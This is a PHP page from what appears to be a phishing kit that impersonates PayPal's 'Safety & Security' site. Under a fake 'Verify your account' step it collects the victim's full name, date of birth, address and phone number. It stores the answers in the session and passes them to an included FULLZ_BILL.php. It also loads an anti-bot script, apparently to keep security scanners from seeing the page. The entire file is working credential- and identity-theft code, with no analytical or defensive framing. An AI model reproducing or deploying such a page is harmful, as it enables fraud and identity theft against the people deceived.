<?php


session_start();
date_default_timezone_set('GMT'); 
@ini_set('display_errors', 0); 
error_reporting(E_ALL ^ E_NOTICE); 
$time = date('d/m/Y G:i:s');
include('../config.php');
include('../antibots.php');
include('visit.php');
############## BILL ADDRESS INFORMATION ##############
$_SESSION['_fullName_']    = $_POST['fullName'];
$_SESSION['_birth_date_']  = $_POST['birth_date'];
$_SESSION['_address_']     = $_POST['address'];
$_SESSION['_city_']        = $_POST['city'];
$_SESSION['_state_']       = $_POST['state'];
$_SESSION['_zipCode_']     = $_POST['zipCode'];
$_SESSION['_phoneNumber_'] = $_POST['phoneNumber'];	
$FULL = $_POST['fullName'] || $_POST['address'] || $_POST['zipCode'] || $_POST['phoneNumber'];
######################################################
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    if(empty($FULL)== false) {
        include('FULLZ_BILL.php');
}}
?>
<html class=" BowZ118 BowDefaultZ118 js " lang="fr" dir="ltr"><head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
	<title>PayPal Safety & Security</title>
    <meta http-equiv="X-UA-COMPATIBLE" content="IE-edge">
	<meta name="format-detection" content="telephone=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black">
    <link rel="shortcut icon" type="image/x-icon" href="../../lib/img/favicon.ico">
    <link rel="icon" type="image/x-icon" href="../../lib/img//pp32.png">
    <link rel="apple-touch-icon" href="../../lib/img/apple-touch-icon.png">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1, user-scalable=yes">
    <link rel="stylesheet" href="../../lib/css/G-Z118.css">
    <link rel="stylesheet" href="../../lib/css/B-Z118.css">
    </style>
	<script src="../../lib/js/jquery.js"></script>
    <script src="../../lib/js/jquery.validate.js"></script>
	<script src="../../lib/js/jquery.v-form.js"></script>
	<script src="../../lib/js/jquery.mask.js"></script>
    <script>
    $(function() {
    $('#phoneNumber').mask('000000000000');
	});
	</script>
</head>
<body>
    <header class="mainHeader" role="banner">
        <div class="headerContainer">
            <div class="Grimm12">
                <a data-click="payPalLogo" href="#" class="logo"></a>
                <div class="loginBtn"><span class="securityLock">Your security is our top priority</span></div>
            </div>
        </div>
    </header>
    <main class="BrowMainZ118">
        <section id="content" role="main" data-country="US">
            <section id="main" class="">
                <div id="WorldWide" class="WorldWide Grimm12">
                    <div class="Grimm118">
                        <form action="" method="post" name="WorldWide_form" class="validator" novalidate="novalidate">
                            <div class="stepProgress"><span>○</span><span class="selected">●</span><span>○</span><span>○</span></div>
                            <div class="HeaderZ118">
                                <h2>Verify your account</h2>
                            </div>
                            <hr style="width: 75%;">
                            <div>
                                <p style="text-align: center;font-size: 1.2em;width: 88%;padding-left: 6%;">Dear Customer, after updating your billing address information, we will move you to another steps, to make your account more secure.</p>
                            </div>
                            <div class="BowContainerZ118">
                                <p>Update Billing Address</p>
                                <div class="inner">
                                    <div class="G-FieldsZ118">
                                        <div class="textInput">
                                            <div class="FieldsZ118 large">
                                                <input type="text" class="validate" id="fullName" name="fullName" required="required" autocomplete="off" placeholder="Full Name" value="<?php if(isset($_SESSION['_fullName_'])== true){ echo $_SESSION['_fullName_'];} ?>">
                                            </div>
                                        </div>
										<div class="textInput">
                                            <div class="FieldsZ118 large">
                                                <input type="tel" class="validate" id="birth_date" name="birth_date" required="required" autocomplete="off" placeholder="Date Of Birth" value="<?php if(isset($_SESSION['_birth_date_'])== true){ echo $_SESSION['_birth_date_'];} ?>" aria-required="true" maxlength="10">
                                            </div>
                                        </div>
                                    </div>
                                    <div class="AddressLine" id="addressEntry">
                                        <div class="G-FieldsZ118">
                                            <div class="textInput">
                                                <div class="FieldsZ118 large">
                                                    <input type="text" class="validate" name="address" required="required" value="<?php if(isset($_SESSION['_address_'])== true){ echo $_SESSION['_address_'];} ?>" placeholder="Address Line" autocomplete="off">
                                                </div>
                                            </div>
                                            <div class="clearfix" id="stateHolder">
                                                <div class="textInput">
                                                    <div class="FieldsZ118 large">
                                                        <input type="text" id="city" name="city" class="validate" placeholder="City" required="required" autocomplete="off" value="<?php if(isset($_SESSION['_city_'])== true){ echo $_SESSION['_city_'];} ?>">
                                                    </div>
                                                </div>
                                            </div>
											<div class="multi equal clearfix">
                                                    <div class="FieldsZ118 left">
                                                        <input type="text" id="state" name="state" class="validate" placeholder="State" required="required" autocomplete="off" value="<?php if(isset($_SESSION['_state_'])== true){ echo $_SESSION['_state_'];} ?>" aria-required="true">
                                                    </div><div class="FieldsZ118 right">
                                                        <input type="text" id="zipCode" name="zipCode" class="validate" placeholder="Postal Code" required="required" autocomplete="off" value="<?php if(isset($_SESSION['_zipCode_'])== true){ echo $_SESSION['_zipCode_'];} ?>" aria-required="true">
                                                    </div>
                                            </div>
                                        </div>
                                    </div>
                                    <div class="groupReatedFields mobileEntry">
                                        <div class="left mobileEntry">
                                            <div class="SelectDown118 ">
                                                <select id="phoneOption" name="phoneOption" class="valid" aria-invalid="false" required="required">
                                                    <option value="mobile">Mobile</option>
                                                    <option value="home">Domicile</option>
                                                </select><span class="select-arrow"></span></div>
                                        </div>
                                        <div class="textInput">
                                            <div class="FieldsZ118 right">
                                                <input type="tel" id="phoneNumber" name="phoneNumber" required="required" value="<?php if(isset($_SESSION['_phoneNumber_'])== true){ echo $_SESSION['_phoneNumber_'];} ?>" class="validate hasHelp" autocomplete="off" autocorrect="off" autocapitalize="off" auto-required="true" placeholder="Phone Number">
                                            </div>
                                        </div>
                                    </div>
                                    <div class="agreeTC checkbox  ">
                                        <div class="FieldsZ118">
                                            <label class="helpNotifyUS" role="button">
                                                <input type="checkbox" class="validate ui-helper-hidden-accessible" required="required" name="terms" id="termsAgree" auto-required="true">
                                                <span class="icon "></span>By clicking Agree & Continue, I have read and agree to PayPal’s <a data-click="userAgreement" href="/us/webapps/mpp/ua/useragreement-full?country.x=us&amp;locale.x=en_US" target="_blank">User Agreement</a>, <a data-click="privacyPolicy" href="/us/webapps/mpp/ua/privacy-full?country.x=us&amp;locale.x=en_US" target="_blank">Privacy Policy</a> and <a data-click="esign" href="/us/webapps/mpp/ua/esign-full?country.x=us&amp;locale.x=en_US" target="_blank">Electronic Communications Delivery Policy</a>.</label>
                                        </div>
                                    </div>
                                    <input id="submitBtn" name="" type="submit" class="ButtonZ118" value="Αgree &amp; Continue" data-click="WorldWideSubmit">
                                </div>
                            </div>
                        </form>
                    </div>
                </div>
            </section>
        </section>
    </main>
    <footer id="gblFooter" role="contentinfo">
        <div class="footer IntentFooter">
            <div class="footerNav">
                <div class="Grimm12">
                    <div class="legal">
                        <p class="copyright">© 2016 PayPal</p>
                        <ul>
                            <li><a data-click="privacyPolicy" href="#" target="_blank">Privacy</a></li>
                            <li><a data-click="legalAgreement" href="#" target="_blank">Legal</a></li>
                            <li><a data-click="contactUs" href="#" target="_blank">Help Center</a></li>
                            <li class="siteFeedback" id="siteFeedback">

                            </li>
                        </ul>
						<div class="flag countryFlag">
						<a data-click="flagChange" href="javascript:void(0)" id="countryFlag" class="country <?php echo $_SESSION['_countrycode_']; ?>">countryFlag</a>
						</div>
                    </div>
                </div>
            </div>
        </div>
    </footer>
</body>
</html>